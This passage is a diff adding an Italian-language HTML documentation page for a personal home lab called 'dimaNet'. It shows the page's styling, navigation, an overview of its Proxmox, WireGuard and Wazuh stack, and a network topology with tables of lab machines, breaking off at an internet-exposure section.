@@ -1,0 +1,1813 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>dimaNet - Home Lab Server</title>
+  <style>
+    :root {
+      --bg: #0d1117;
+      --surface: #161b22;
+      --surface2: #1c2128;
+      --border: #30363d;
+      --border-bright: #484f58;
+      --green: #3fb950;
+      --green-dim: #238636;
+      --green-glow: rgba(63,185,80,0.15);
+      --blue: #58a6ff;
+      --blue-glow: rgba(88,166,255,0.12);
+      --yellow: #d29922;
+      --red: #f85149;
+      --purple: #bc8cff;
+      --orange: #e3b341;
+      --text: #c9d1d9;
+      --text-dim: #8b949e;
+      --text-muted: #656d76;
+      --font-mono: 'Cascadia Code', 'Fira Code', 'JetBrains Mono', 'Consolas', monospace;
+      --font-sans: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Inter', sans-serif;
+      --radius: 8px;
+      --radius-lg: 12px;
+      --shadow: 0 4px 24px rgba(0,0,0,0.4);
+      --nav-width: 248px;
+      --header-h: 58px;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font-sans);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      overflow-x: hidden;
+    }
+
+    /* ===== PROGRESS BAR ===== */
+    #progress {
+      position: fixed;
+      top: 0; left: 0;
+      height: 2px;
+      background: linear-gradient(90deg, var(--green), var(--blue));
+      width: 0%;
+      z-index: 9999;
+      transition: width 0.1s;
+    }
+
+    /* ===== TOAST ===== */
+    #toast {
+      position: fixed;
+      bottom: 2rem; right: 2rem;
+      background: var(--surface2);
+      border: 1px solid var(--green);
+      color: var(--green);
+      font-family: var(--font-mono);
+      font-size: 0.8rem;
+      padding: 0.6rem 1rem;
+      border-radius: var(--radius);
+      z-index: 9998;
+      opacity: 0;
+      transform: translateY(8px);
+      transition: opacity 0.2s, transform 0.2s;
+      pointer-events: none;
+    }
+
+    #toast.show { opacity: 1; transform: translateY(0); }
+
+    /* ===== HEADER ===== */
+    header {
+      background: rgba(22,27,34,0.92);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--border);
+      padding: 0 1.5rem;
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      height: var(--header-h);
+      position: fixed;
+      top: 0; left: 0; right: 0;
+      z-index: 200;
+    }
+
+    .logo {
+      font-family: var(--font-mono);
+      font-size: 1.05rem;
+      color: var(--green);
+      font-weight: 700;
+      letter-spacing: 0.04em;
+      white-space: nowrap;
+      display: flex;
+      align-items: center;
+      gap: 0.2em;
+    }
+
+    .logo-sep { color: var(--border-bright); }
+    .logo-sub { color: var(--text-dim); font-weight: 400; }
+
+    .cursor {
+      display: inline-block;
+      width: 2px; height: 1.1em;
+      background: var(--green);
+      border-radius: 1px;
+      animation: blink 1s step-end infinite;
+      vertical-align: middle;
+      margin-left: 1px;
+    }
+
+    @keyframes blink { 50% { opacity: 0; } }
+
+    .header-right {
+      margin-left: auto;
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+    }
+
+    /* Search */
+    .search-wrap {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+
+    .search-wrap svg {
+      position: absolute;
+      left: 0.65rem;
+      color: var(--text-dim);
+      pointer-events: none;
+    }
+
+    #search {
+      background: var(--bg);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      color: var(--text);
+      font-family: var(--font-mono);
+      font-size: 0.8rem;
+      padding: 0.4rem 0.75rem 0.4rem 2.2rem;
+      width: 200px;
+      outline: none;
+      transition: border-color 0.2s, width 0.3s;
+    }
+
+    #search:focus {
+      border-color: var(--blue);
+      width: 280px;
+      box-shadow: 0 0 0 3px var(--blue-glow);
+    }
+
+    #search::placeholder { color: var(--text-muted); }
+
+    .kbd {
+      font-family: var(--font-mono);
+      font-size: 0.65rem;
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: 0.1rem 0.35rem;
+      color: var(--text-dim);
+    }
+
+    /* Hamburger */
+    #hamburger {
+      display: none;
+      flex-direction: column;
+      gap: 4px;
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 4px;
+    }
+
+    #hamburger span {
+      display: block;
+      width: 22px; height: 2px;
+      background: var(--text-dim);
+      border-radius: 1px;
+      transition: all 0.25s;
+    }
+
+    #hamburger.open span:nth-child(1) { transform: translateY(6px) rotate(45deg); }
+    #hamburger.open span:nth-child(2) { opacity: 0; }
+    #hamburger.open span:nth-child(3) { transform: translateY(-6px) rotate(-45deg); }
+
+    /* ===== LAYOUT ===== */
+    .layout {
+      display: flex;
+      flex: 1;
+      padding-top: var(--header-h);
+      max-width: 1440px;
+      width: 100%;
+      margin: 0 auto;
+    }
+
+    /* ===== SIDEBAR ===== */
+    nav {
+      width: var(--nav-width);
+      min-width: var(--nav-width);
+      background: var(--surface);
+      border-right: 1px solid var(--border);
+      padding: 1.25rem 0 2rem;
+      position: fixed;
+      top: var(--header-h);
+      left: 0;
+      height: calc(100vh - var(--header-h));
+      overflow-y: auto;
+      z-index: 150;
+      transition: transform 0.28s cubic-bezier(.4,0,.2,1);
+    }
+
+    nav::-webkit-scrollbar { width: 4px; }
+    nav::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+
+    .nav-section { padding: 0 0.75rem 1rem; }
+
+    .nav-label {
+      font-size: 0.62rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      color: var(--text-muted);
+      padding: 0.5rem 0.5rem 0.3rem;
+      margin-bottom: 0.2rem;
+    }
+
+    nav a {
+      display: flex;
+      align-items: center;
+      gap: 0.6rem;
+      padding: 0.42rem 0.65rem;
+      border-radius: 6px;
+      font-size: 0.845rem;
+      color: var(--text-dim);
+      text-decoration: none;
+      cursor: pointer;
+      transition: background 0.12s, color 0.12s;
+      position: relative;
+      user-select: none;
+    }
+
+    nav a:hover {
+      background: rgba(255,255,255,0.05);
+      color: var(--text);
+    }
+
+    nav a.active {
+      background: var(--green-glow);
+      color: var(--green);
+      font-weight: 500;
+    }
+
+    nav a.active::before {
+      content: '';
+      position: absolute;
+      left: 0; top: 20%; bottom: 20%;
+      width: 2px;
+      background: var(--green);
+      border-radius: 0 2px 2px 0;
+    }
+
+    .nav-icon { font-size: 0.95rem; opacity: 0.9; }
+
+    /* ===== OVERLAY (mobile) ===== */
+    #overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.6);
+      z-index: 140;
+    }
+
+    /* ===== MAIN ===== */
+    main {
+      flex: 1;
+      margin-left: var(--nav-width);
+      padding: 2.5rem 3rem 4rem;
+      max-width: calc(var(--nav-width) + 900px);
+      min-height: calc(100vh - var(--header-h));
+    }
+
+    /* ===== SEARCH RESULTS ===== */
+    #search-results {
+      display: none;
+    }
+
+    #search-results.active { display: block; }
+
+    .sr-item {
+      padding: 0.9rem 1rem;
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      margin-bottom: 0.6rem;
+      cursor: pointer;
+      transition: border-color 0.15s, background 0.15s;
+    }
+
+    .sr-item:hover {
+      border-color: var(--blue);
+      background: var(--blue-glow);
+    }
+
+    .sr-page {
+      font-size: 0.7rem;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      color: var(--blue);
+      font-family: var(--font-mono);
+      margin-bottom: 0.25rem;
+    }
+
+    .sr-title {
+      font-size: 0.9rem;
+      font-weight: 600;
+      color: var(--text);
+      margin-bottom: 0.2rem;
+    }
+
+    .sr-excerpt {
+      font-size: 0.8rem;
+      color: var(--text-dim);
+      line-height: 1.5;
+    }
+
+    mark {
+      background: rgba(210,153,34,0.25);
+      color: var(--orange);
+      border-radius: 2px;
+      padding: 0 2px;
+    }
+
+    /* ===== PAGE TRANSITIONS ===== */
+    .page {
+      display: none;
+      animation: fadeIn 0.18s ease;
+    }
+
+    .page.active { display: block; }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(6px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    /* ===== TYPOGRAPHY ===== */
+    h1 {
+      font-size: 1.85rem;
+      font-weight: 700;
+      color: var(--text);
+      margin-bottom: 0.35rem;
+      line-height: 1.2;
+    }
+
+    h2 {
+      font-size: 1.15rem;
+      font-weight: 600;
+      color: var(--text);
+      margin: 2.2rem 0 0.75rem;
+      padding-bottom: 0.4rem;
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    h3 {
+      font-size: 0.95rem;
+      font-weight: 600;
+      color: var(--blue);
+      margin: 1.4rem 0 0.5rem;
+      font-family: var(--font-mono);
+    }
+
+    p { line-height: 1.75; color: var(--text); margin-bottom: 0.85rem; }
+
+    .subtitle {
+      color: var(--text-dim);
+      font-size: 0.875rem;
+      margin-bottom: 1.75rem;
+      line-height: 1.6;
+    }
+
+    strong { color: var(--text); font-weight: 600; }
+
+    /* ===== HERO ===== */
+    .hero {
+      background: linear-gradient(135deg, var(--surface) 0%, var(--surface2) 100%);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-lg);
+      padding: 1.75rem 2rem;
+      margin-bottom: 2rem;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .hero::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0;
+      height: 2px;
+      background: linear-gradient(90deg, var(--green), var(--blue), var(--purple));
+      border-radius: var(--radius-lg) var(--radius-lg) 0 0;
+    }
+
+    .hero-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+      gap: 0.75rem;
+      margin-top: 1.25rem;
+    }
+
+    .hero-stat {
+      background: var(--bg);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 1rem;
+      text-align: center;
+      transition: border-color 0.2s;
+    }
+
+    .hero-stat:hover { border-color: var(--green-dim); }
+
+    .hero-stat .val {
+      font-size: 1.35rem;
+      font-weight: 700;
+      font-family: var(--font-mono);
+      color: var(--green);
+      display: block;
+    }
+
+    .hero-stat .lbl {
+      font-size: 0.72rem;
+      color: var(--text-dim);
+      margin-top: 0.2rem;
+    }
+
+    /* ===== BADGES ===== */
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      font-size: 0.68rem;
+      font-weight: 600;
+      padding: 0.15rem 0.5rem;
+      border-radius: 99px;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      white-space: nowrap;
+    }
+
+    .badge-done   { background: rgba(63,185,80,0.12);  color: var(--green); }
+    .badge-wip    { background: rgba(210,153,34,0.12); color: var(--yellow); }
+    .badge-plan   { background: rgba(88,166,255,0.12); color: var(--blue); }
+    .badge-high   { background: rgba(248,81,73,0.12);  color: var(--red); }
+    .badge-med    { background: rgba(210,153,34,0.12); color: var(--yellow); }
+    .badge-low    { background: rgba(63,185,80,0.12);  color: var(--green); }
+
+    /* ===== TABLES ===== */
+    .table-wrap { overflow-x: auto; margin: 0.75rem 0 1.5rem; border-radius: var(--radius); border: 1px solid var(--border); }
+
+    table { width: 100%; border-collapse: collapse; font-size: 0.845rem; }
+
+    th {
+      background: var(--surface2);
+      color: var(--text-dim);
+      font-weight: 600;
+      text-align: left;
+      padding: 0.6rem 0.9rem;
+      border-bottom: 1px solid var(--border);
+      font-size: 0.72rem;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      white-space: nowrap;
+    }
+
+    td {
+      padding: 0.55rem 0.9rem;
+      border-bottom: 1px solid var(--border);
+      color: var(--text);
+      vertical-align: middle;
+    }
+
+    tr:last-child td { border-bottom: none; }
+    tr:hover td { background: rgba(255,255,255,0.018); }
+
+    /* ===== CODE ===== */
+    code {
+      font-family: var(--font-mono);
+      font-size: 0.82em;
+      background: rgba(110,118,129,0.12);
+      padding: 0.1em 0.38em;
+      border-radius: 4px;
+      color: var(--purple);
+    }
+
+    .pre-wrap {
+      position: relative;
+      margin: 0.75rem 0 1.25rem;
+    }
+
+    pre {
+      background: #010409;
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 1.2rem 1.4rem 1.2rem;
+      overflow-x: auto;
+      line-height: 1.65;
+      color: #e6edf3;
+      font-family: var(--font-mono);
+      font-size: 0.82rem;
+    }
+
+    pre code { background: none; padding: 0; color: inherit; font-size: inherit; }
+
+    /* Syntax highlight classes */
+    .sh-cmd    { color: #79c0ff; }   /* command */
+    .sh-flag   { color: #ffab70; }   /* flag/arg */
+    .sh-str    { color: #a5d6ff; }   /* string */
+    .sh-cmt    { color: #8b949e; font-style: italic; } /* comment */
+    .sh-kw     { color: #ff7b72; }   /* keyword */
+    .sh-val    { color: #3fb950; }   /* value/number */
+    .sh-prompt { color: #6e7681; }   /* $ prompt */
+
+    .copy-btn {
+      position: absolute;
+      top: 0.6rem; right: 0.6rem;
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      border-radius: 5px;
+      color: var(--text-dim);
+      font-family: var(--font-mono);
+      font-size: 0.7rem;
+      padding: 0.25rem 0.55rem;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 0.3rem;
+      transition: background 0.15s, color 0.15s, border-color 0.15s;
+      z-index: 1;
+    }
+
+    .copy-btn:hover { background: var(--surface); color: var(--text); border-color: var(--border-bright); }
+    .copy-btn.copied { color: var(--green); border-color: var(--green); }
+
+    /* ===== CARDS ===== */
+    .card-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+      gap: 0.85rem;
+      margin: 0.75rem 0 1.5rem;
+    }
+
+    .card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 1.1rem 1.2rem;
+      transition: border-color 0.2s, transform 0.15s, box-shadow 0.2s;
+      cursor: default;
+    }
+
+    .card:hover {
+      border-color: var(--green-dim);
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(0,0,0,0.3);
+    }
+
+    .card-title {
+      font-size: 0.9rem;
+      font-weight: 600;
+      color: var(--text);
+      margin-bottom: 0.45rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .card-body { font-size: 0.82rem; color: var(--text-dim); line-height: 1.6; }
+
+    /* ===== TIMELINE ===== */
+    .timeline { margin: 1rem 0 1.5rem; padding-left: 1rem; border-left: 2px solid var(--border); }
+
+    .tl-item { position: relative; padding: 0 0 1.1rem 1.2rem; }
+
+    .tl-dot {
+      position: absolute;
+      left: -5px; top: 4px;
+      width: 8px; height: 8px;
+      border-radius: 50%;
+      background: var(--green);
+      border: 2px solid var(--bg);
+    }
+
+    .tl-dot.warn { background: var(--yellow); }
+    .tl-dot.err  { background: var(--red); }
+    .tl-dot.info { background: var(--blue); }
+
+    .tl-time {
+      font-size: 0.72rem;
+      color: var(--text-dim);
+      font-family: var(--font-mono);
+      margin-bottom: 0.18rem;
+    }
+
+    .tl-desc { font-size: 0.875rem; color: var(--text); line-height: 1.55; }
+
+    /* ===== ALERTS ===== */
+    .alert {
+      border-radius: var(--radius);
+      padding: 0.9rem 1.1rem;
+      margin: 0.8rem 0 1.2rem;
+      font-size: 0.875rem;
+      line-height: 1.65;
+      border-left: 3px solid;
+      display: flex;
+      gap: 0.75rem;
+      align-items: flex-start;
+    }
+
+    .alert-icon { font-size: 1rem; flex-shrink: 0; margin-top: 0.05rem; }
+
+    .alert-info  { background: var(--blue-glow);              border-color: var(--blue); }
+    .alert-warn  { background: rgba(210,153,34,0.08);         border-color: var(--yellow); }
+    .alert-ok    { background: var(--green-glow);             border-color: var(--green); }
+    .alert-err   { background: rgba(248,81,73,0.08);          border-color: var(--red); }
+
+    /* ===== CHECKLIST ===== */
+    .checklist { list-style: none; margin: 0.4rem 0 1rem; }
+
+    .checklist li {
+      display: flex;
+      align-items: flex-start;
+      gap: 0.6rem;
+      padding: 0.28rem 0;
+      font-size: 0.875rem;
+      color: var(--text);
+    }
+
+    .ck { flex-shrink: 0; margin-top: 0.06rem; font-size: 0.85rem; }
+    li.done .ck { color: var(--green); }
+    li.todo .ck { color: var(--text-muted); }
+    li.wip  .ck { color: var(--yellow); }
+
+    /* ===== DIVIDER ===== */
+    hr { border: none; border-top: 1px solid var(--border); margin: 1.75rem 0; }
+
+    /* ===== TOC ===== */
+    .toc {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 1rem 1.2rem;
+      margin-bottom: 1.5rem;
+      font-size: 0.83rem;
+    }
+
+    .toc-title {
+      font-size: 0.7rem;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      color: var(--text-muted);
+      font-weight: 700;
+      margin-bottom: 0.6rem;
+    }
+
+    .toc-list { list-style: none; }
+
+    .toc-list li { padding: 0.18rem 0; }
+
+    .toc-list a {
+      color: var(--blue);
+      text-decoration: none;
+      font-family: var(--font-mono);
+      cursor: pointer;
+    }
+
+    .toc-list a:hover { color: var(--text); }
+
+    /* ===== BACK TO TOP ===== */
+    #btt {
+      position: fixed;
+      bottom: 2rem; right: 2rem;
+      width: 40px; height: 40px;
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      border-radius: 50%;
+      color: var(--text-dim);
+      font-size: 1.1rem;
+      cursor: pointer;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      transition: background 0.15s, color 0.15s, border-color 0.15s;
+      z-index: 50;
+    }
+
+    #btt:hover { background: var(--surface); color: var(--text); border-color: var(--border-bright); }
+    #btt.visible { display: flex; }
+
+    /* ===== KEYBOARD SHORTCUT HELP ===== */
+    #shortcut-modal {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.7);
+      z-index: 500;
+      align-items: center;
+      justify-content: center;
+    }
+
+    #shortcut-modal.open { display: flex; }
+
+    .modal-box {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-lg);
+      padding: 1.5rem 2rem;
+      min-width: 320px;
+      box-shadow: var(--shadow);
+    }
+
+    .modal-title {
+      font-size: 0.75rem;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      color: var(--text-muted);
+      margin-bottom: 1rem;
+      font-weight: 700;
+    }
+
+    .shortcut-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 0.35rem 0;
+      font-size: 0.85rem;
+      color: var(--text-dim);
+    }
+
+    .shortcut-row .keys { display: flex; gap: 0.3rem; }
+
+    /* ===== RESPONSIVE ===== */
+    @media (max-width: 800px) {
+      nav {
+        transform: translateX(-100%);
+      }
+      nav.open {
+        transform: translateX(0);
+        box-shadow: 8px 0 32px rgba(0,0,0,0.5);
+      }
+      #hamburger { display: flex; }
+      main { margin-left: 0; padding: 1.5rem 1.25rem 3rem; }
+      #search { width: 150px; }
+      #search:focus { width: 200px; }
+      .hero-grid { grid-template-columns: repeat(2, 1fr); }
+      .card-grid  { grid-template-columns: 1fr; }
+    }
+
+    @media (max-width: 480px) {
+      h1 { font-size: 1.5rem; }
+      main { padding: 1.25rem 1rem 3rem; }
+      .hero { padding: 1.25rem; }
+      .hero-grid { grid-template-columns: 1fr 1fr; }
+    }
+
+    /* ===== SCROLLBAR ===== */
+    ::-webkit-scrollbar { width: 6px; height: 6px; }
+    ::-webkit-scrollbar-track { background: transparent; }
+    ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+    ::-webkit-scrollbar-thumb:hover { background: var(--border-bright); }
+  </style>
+</head>
+<body>
+
+<div id="progress"></div>
+<div id="toast"></div>
+<div id="overlay" onclick="closeMobileNav()"></div>
+
+<!-- SHORTCUT MODAL -->
+<div id="shortcut-modal" onclick="this.classList.remove('open')">
+  <div class="modal-box" onclick="event.stopPropagation()">
+    <div class="modal-title">Keyboard Shortcuts</div>
+    <div class="shortcut-row"><span>Ricerca</span><div class="keys"><span class="kbd">/</span></div></div>
+    <div class="shortcut-row"><span>Scorciatoie</span><div class="keys"><span class="kbd">?</span></div></div>
+    <div class="shortcut-row"><span>Chiudi</span><div class="keys"><span class="kbd">Esc</span></div></div>
+    <div class="shortcut-row"><span>Home</span><div class="keys"><span class="kbd">g</span><span class="kbd">h</span></div></div>
+    <div class="shortcut-row"><span>PoC Lab</span><div class="keys"><span class="kbd">g</span><span class="kbd">p</span></div></div>
+    <div class="shortcut-row"><span>Incidenti</span><div class="keys"><span class="kbd">g</span><span class="kbd">i</span></div></div>
+    <div style="margin-top:1rem;font-size:0.75rem;color:var(--text-muted);text-align:center">Clicca ovunque per chiudere</div>
+  </div>
+</div>
+
+<!-- HEADER -->
+<header>
+  <button id="hamburger" onclick="toggleMobileNav()" aria-label="Menu">
+    <span></span><span></span><span></span>
+  </button>
+
+  <div class="logo">
+    <span style="color:var(--green)">dimaNet</span><span class="logo-sep">/</span><span class="logo-sub">homeLabServer</span><span class="cursor"></span>
+  </div>
+
+  <div class="header-right">
+    <div class="search-wrap">
+      <svg width="14" height="14" viewBox="0 0 16 16" fill="currentColor">
+        <path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.868-3.834zm-5.242 1.156a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"/>
+      </svg>
+      <input id="search" type="search" placeholder="Cerca... (/)" autocomplete="off" />
+    </div>
+    <span class="kbd" onclick="document.getElementById('shortcut-modal').classList.add('open')" style="cursor:pointer">?</span>
+  </div>
+</header>
+
+<!-- SIDEBAR -->
+<div class="layout">
+  <nav id="sidebar">
+    <div class="nav-section">
+      <div class="nav-label">Generale</div>
+      <a class="active" onclick="show('home')" data-page="home"><span class="nav-icon">&#127968;</span> Home</a>
+      <a onclick="show('infra')"    data-page="infra"><span class="nav-icon">&#128421;</span> Infrastruttura</a>
+      <a onclick="show('roadmap')"  data-page="roadmap"><span class="nav-icon">&#128203;</span> Roadmap</a>
+    </div>
+    <div class="nav-section">
+      <div class="nav-label">Security Research</div>
+      <a onclick="show('poc')"       data-page="poc"><span class="nav-icon">&#128295;</span> PoC Lab</a>
+      <a onclick="show('cve-regres')" data-page="cve-regres"><span class="nav-icon">&#128683;</span> CVE-2024-6387</a>
+      <a onclick="show('botnet')"    data-page="botnet"><span class="nav-icon">&#129302;</span> Botnet Lab</a>
+      <a onclick="show('soc')"       data-page="soc"><span class="nav-icon">&#128065;</span> SOC / SIEM</a>
+    </div>
+    <div class="nav-section">
+      <div class="nav-label">Operazioni</div>
+      <a onclick="show('vpn')"       data-page="vpn"><span class="nav-icon">&#128274;</span> VPN Setup</a>
+      <a onclick="show('incidents')" data-page="incidents"><span class="nav-icon">&#128680;</span> Incidenti</a>
+      <a onclick="show('power')"     data-page="power"><span class="nav-icon">&#9889;</span> Remote Power</a>
+    </div>
+  </nav>
+
+  <!-- MAIN -->
+  <main id="main-content">
+    <div id="search-results"></div>
+
+    <!-- ======= HOME ======= -->
+    <section class="page active" id="home">
+      <h1>dimaNet</h1>
+      <p class="subtitle">Home lab su bare metal &mdash; virtualizzazione, pentesting e ricerca sicurezza informatica.</p>
+
+      <div class="hero">
+        <p>Il progetto nasce dall'esigenza di avere un ambiente centralizzato accessibile da remoto, indipendente dal dispositivo in uso. Gestione remota tramite DDNS e WireGuard VPN, pentesting lab su rete isolata, sperimentazione su virtualizzazione e sicurezza.</p>
+        <div class="hero-grid">
+          <div class="hero-stat"><span class="val">Proxmox VE 8.2</span><div class="lbl">Hypervisor host</div></div>
+          <div class="hero-stat"><span class="val counter" data-target="16">0</span><div class="lbl">GB RAM server</div></div>
+          <div class="hero-stat"><span class="val">WireGuard</span><div class="lbl">VPN accesso remoto</div></div>
+          <div class="hero-stat"><span class="val counter" data-target="7">0</span><div class="lbl">VM / Container attivi</div></div>
+          <div class="hero-stat"><span class="val counter" data-target="5">0</span><div class="lbl">PoC documentati</div></div>
+          <div class="hero-stat"><span class="val counter" data-target="94">0</span><div class="lbl">GB storage (Proxmox)</div></div>
+        </div>
+      </div>
+
+      <h2>&#128269; Cosa gira</h2>
+      <div class="card-grid">
+        <div class="card"><div class="card-title">&#128421; Proxmox VE</div><div class="card-body">Hypervisor bare metal. Gestisce VM e container LXC. Web UI su 8006, accessibile solo da LAN e VPN. Kernel 6.8.4-2-pve.</div></div>
+        <div class="card"><div class="card-title">&#128274; WireGuard VPN</div><div class="card-body">Gestito con PiVPN. Split tunnel: solo il traffico verso la VPN nel tunnel. DDNS No-IP per hostname fisso su IP dinamico.</div></div>
+        <div class="card"><div class="card-title">&#128065; Wazuh SIEM</div><div class="card-body">Stack SOC completo: Manager + Dashboard + Indexer su cs55. Agente su cs33 (victim). Kali cs20 come red team.</div></div>
+        <div class="card"><div class="card-title">&#128100; Pi-hole DNS</div><div class="card-body">Raspberry Pi (narutoPi) come DNS ad-blocker per tutta la rete. Fail2ban con ignoreip LAN+VPN. Wazuh agent integrato.</div></div>
+        <div class="card"><div class="card-title">&#128293; PoC Lab</div><div class="card-body">Ambiente isolato per ricerca CVE: regreSSHion, DoS nginx/k3s, botnet C2+agent, privilege escalation con linpeas.</div></div>
+        <div class="card"><div class="card-title">&#9889; Remote Power</div><div class="card-body">Server a Milano gestito da Praga. Accensione programmata via <code>rtcwake</code> usando il Real Time Clock hardware della scheda madre.</div></div>
+      </div>
+
+      <h2>&#9881; Stack tecnologico</h2>
+      <div class="table-wrap">
+        <table>
+          <tr><th>Categoria</th><th>Tecnologia</th><th>Uso</th></tr>
+          <tr><td>Virtualizzazione</td><td>Proxmox VE, LXC</td><td>Hypervisor bare metal + container</td></tr>
+          <tr><td>VPN</td><td>WireGuard + PiVPN</td><td>Accesso remoto cifrato</td></tr>
+          <tr><td>DDNS</td><td>No-IP</td><td>Hostname fisso su IP dinamico ISP</td></tr>
+          <tr><td>SIEM</td><td>Wazuh</td><td>Log, alert, dashboard SOC</td></tr>
+          <tr><td>DNS</td><td>Pi-hole FTL v2.92</td><td>Ad-block + DNS filtering</td></tr>
+          <tr><td>IDS</td><td>Suricata</td><td>Network intrusion detection</td></tr>
+          <tr><td>Monitoring</td><td>fail2ban</td><td>Blocco automatico brute force</td></tr>
+          <tr><td>Automazione</td><td>Ansible, shell scripting</td><td>Setup e manutenzione</td></tr>
+          <tr><td>Backup</td><td>rsync + cron, Bacula</td><td>Backup periodici automatici</td></tr>
+          <tr><td>OS guest</td><td>Kali, Ubuntu, Debian, Arch</td><td>Ambienti lab e ricerca</td></tr>
+        </table>
+      </div>
+    </section>
+
+    <!-- ======= INFRASTRUTTURA ======= -->
+    <section class="page" id="infra">
+      <h1>Infrastruttura</h1>
+      <p class="subtitle">Topologia di rete, macchine virtuali e container attivi.</p>
+
+      <h2>&#128506; Topologia</h2>
+      <div class="pre-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">&#128203; copia</button>
+        <pre>Internet
+    |
+ [Router Vodafone] ---- Port forwarding 51820/UDP (WireGuard)
+    |
+ [Firewall pve (policy IN: DROP)]
+    |
+ [DIMANET - Proxmox VE 8.2]  192.168.1.100
+    |
+    +-- [cs20]  Kali Linux 2025.4    VM-120  <-- Red Team / Attacker
+    +-- [cs33]  Ubuntu LXC           CT-133  <-- Wazuh Agent / Victim
+    +-- [cs55]  Ubuntu VM            VM-155  <-- Wazuh Manager + Dashboard
+    +-- [cs42]  Ubuntu VM   192.168.1.5      <-- SOC (Wazuh all-in-one)
+    +-- [Arch]  LXC         CT-104           <-- Dev shell environment
+    |
+    +-- [narutoPi] 192.168.1.31              <-- Pi-hole DNS + Wazuh agent
+
+[MacBook / Client remoto]
+    |--- WireGuard tunnel (10.x.x.2) --> Proxmox wg0 (10.x.x.1)</pre>
+      </div>
+
+      <h2>&#128187; Macchine attive</h2>
+      <div class="table-wrap">
+        <table>
+          <tr><th>ID</th><th>Nome</th><th>Tipo</th><th>OS</th><th>Ruolo</th><th>Stato</th></tr>
+          <tr><td><code>120</code></td><td>cs20</td><td>VM</td><td>Kali Linux 2025.4</td><td>Red Team / Attacker</td><td><span class="badge badge-done">running</span></td></tr>
+          <tr><td><code>133</code></td><td>cs33</td><td>CT</td><td>Ubuntu LXC</td><td>Victim / Wazuh Agent</td><td><span class="badge badge-wip">stopped</span></td></tr>
+          <tr><td><code>155</code></td><td>cs55</td><td>VM</td><td>Ubuntu</td><td>Wazuh Manager + Dashboard</td><td><span class="badge badge-wip">stopped</span></td></tr>
+          <tr><td><code>104</code></td><td>default-archlinux</td><td>CT</td><td>Arch Linux</td><td>Dev shell environment</td><td><span class="badge badge-wip">stopped</span></td></tr>
+          <tr><td><code>100</code></td><td>dimorega-net-ct</td><td>CT</td><td>-</td><td>Network testing</td><td><span class="badge badge-wip">stopped</span></td></tr>
+          <tr><td><code>106</code></td><td>shs</td><td>VM</td><td>-</td><td>Security hardening study</td><td><span class="badge badge-wip">stopped</span></td></tr>
+        </table>
+      </div>
+
+      <h2>&#127968; Dispositivi LAN</h2>
+      <div class="table-wrap">
+        <table>
+          <tr><th>IP</th><th>Hostname</th><th>OS</th><th>Ruolo</th><th>SSH alias</th></tr>
+          <tr><td><code>192.168.1.100</code></td><td>proxmox</td><td>Proxmox VE 8.2 / Debian, kernel 6.8.4-2-pve</td><td>Server principale / Hypervisor</td><td><code>ssh proxmox</code></td></tr>
+          <tr><td><code>192.168.1.5</code></td><td>cs42</td><td>Ubuntu Linux</td><td>SOC / Wazuh SIEM all-in-one</td><td><code>ssh cs42</code></td></tr>
+          <tr><td><code>192.168.1.31</code></td><td>narutoPi</td><td>Raspbian / Debian 13</td><td>Pi-hole DNS + Wazuh agent</td><td><code>ssh naruto</code></td></tr>
+        </table>
+      </div>
+
+      <h2>&#127760; Esposizione internet</h2>
+      <div class="alert alert-warn">
